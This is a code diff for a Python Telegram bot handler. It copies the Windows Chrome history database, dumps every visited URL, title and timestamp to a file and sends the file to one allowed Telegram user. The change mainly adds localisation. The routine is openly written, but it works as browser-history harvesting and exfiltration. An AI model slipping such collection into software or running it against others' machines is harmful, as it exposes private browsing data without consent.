@@ -25,91 +25,80 @@ import shutil
 import sqlite3
 
 from config import ALLOWED_USER_ID, directory
+from lib.texts import TEXTS, user_languages
 
 def register_chrome_history_handlers(dp):
-    @dp.message(F.text.lower() == "история хрома")
+    @dp.message(F.text.lower().in_({"история хрома", "chrome history"}))
     @dp.message(Command("chrome_history"))
     async def cmd_start(message: types.Message):
-        if message.from_user.id == ALLOWED_USER_ID:
-            def get_chrome_history():
-                # Путь к файлу истории Chrome (для Windows)
-                history_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\History')
+        user_id = message.from_user.id
+        lang = user_languages.get(user_id, 'en')
+        texts = TEXTS[lang]
 
-                # Проверка, существует ли файл истории
-                if not os.path.exists(history_path):
-                    return False, "Файл истории Chrome не найден. Возможно, браузер Chrome не установлен."
+        if user_id != ALLOWED_USER_ID:
+            await message.answer(texts.get("access_denied", "Access denied."))
+            return
 
-                # Создаем временную копию файла, так как файл может быть заблокирован для чтения
-                temp_history_path = 'temp_history'
-                shutil.copy2(history_path, temp_history_path)
+        await message.answer(texts.get("chrome_history_start", "Getting Chrome history. Please wait..."))
 
-                # Подключаемся к базе данных SQLite
-                conn = sqlite3.connect(temp_history_path)
-                cursor = conn.cursor()
+        def get_chrome_history():
+            history_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\History')
 
-                # Запрос для извлечения истории посещенных страниц
-                query = """
-                SELECT urls.url, urls.title, urls.last_visit_time
-                FROM urls
-                ORDER BY last_visit_time DESC
-                """
-                cursor.execute(query)
+            if not os.path.exists(history_path):
+                return False, texts.get("chrome_history_not_found", "Chrome history file not found. Is Chrome installed?")
 
-                rows = cursor.fetchall()
+            temp_history_path = 'temp_history'
+            shutil.copy2(history_path, temp_history_path)
 
-                # Переменная для накопления текста
-                text_to_save = ""
+            conn = sqlite3.connect(temp_history_path)
+            cursor = conn.cursor()
 
-                # Форматируем вывод
-                for row in rows:
-                    url = row[0]
-                    title = row[1]
-                    last_visit_time = row[2]
+            query = """
+            SELECT urls.url, urls.title, urls.last_visit_time
+            FROM urls
+            ORDER BY last_visit_time DESC
+            """
+            cursor.execute(query)
 
-                    # Преобразуем время последнего посещения
-                    try:
-                        if last_visit_time > 0:
-                            # Преобразуем время в формат Unix timestamp
-                            last_visit_time = last_visit_time / 1000000 - 11644473600
-                            last_visit_time = datetime.datetime.fromtimestamp(last_visit_time).strftime('%Y-%m-%d %H:%M:%S')
-                        else:
-                            last_visit_time = 'Invalid time'
-                    except (OSError, ValueError) as e:
-                        last_visit_time = f'Error: {str(e)}'
+            rows = cursor.fetchall()
 
-                    # Накопление текста
-                    text_to_save += f"URL: {url}\nTitle: {title}\nLast Visit: {last_visit_time}\n\n"
+            text_to_save = ""
+            for row in rows:
+                url = row[0]
+                title = row[1]
+                last_visit_time = row[2]
 
-                # Полный путь к файлу
-                file_path = os.path.join(directory, 'История_Хрома.txt')
+                try:
+                    if last_visit_time > 0:
+                        last_visit_time = last_visit_time / 1000000 - 11644473600
+                        last_visit_time = datetime.datetime.fromtimestamp(last_visit_time).strftime('%Y-%m-%d %H:%M:%S')
+                    else:
+                        last_visit_time = texts.get("invalid_time", "Invalid time")
+                except (OSError, ValueError) as e:
+                    last_visit_time = f'{texts.get("error_time", "Error")}: {str(e)}'
 
-                # Сохранение накопленного текста в файл
-                with open(file_path, 'w', encoding='utf-8') as file:
-                    file.write(text_to_save)
+                text_to_save += f"URL: {url}\nTitle: {title}\nLast Visit: {last_visit_time}\n\n"
 
-                # Закрываем соединение
-                conn.close()
+            file_path = os.path.join(directory, texts.get("chrome_history_filename", "Chrome_History.txt"))
 
-                # Удаляем временный файл
-                os.remove(temp_history_path)
+            with open(file_path, 'w', encoding='utf-8') as file:
+                file.write(text_to_save)
 
-                return True, file_path
+            conn.close()
+            os.remove(temp_history_path)
 
-            await message.answer("Получение истории Chrome. Пожалуйста, подождите...")
-            success, result = get_chrome_history()
+            return True, file_path
 
-            if not success:
-                await message.answer(result)
-                return
+        success, result = get_chrome_history()
 
-            file_path = result
-            try:
-                file_to_send = FSInputFile(file_path)
+        if not success:
+            await message.answer(result)
+            return
 
-                await message.answer_document(document=file_to_send, caption="Вот ваш файл, root!")
-
-            except Exception as e:
-                await message.answer(f"Ошибка при отправке файла: {e}")
-            os.remove(file_path)
-        else:
-            await message.answer("К сожалению, у вас нет доступа к этому боту.")
+        file_path = result
+        try:
+            file_to_send = FSInputFile(file_path)
+            await message.answer_document(document=file_to_send, caption=texts.get("chrome_history_caption", "Here is your Chrome history, root!"))
+        except Exception as e:
+            await message.answer(f"{texts.get('chrome_history_send_error', 'Error sending file')}: {e}")
+        os.remove(file_path)
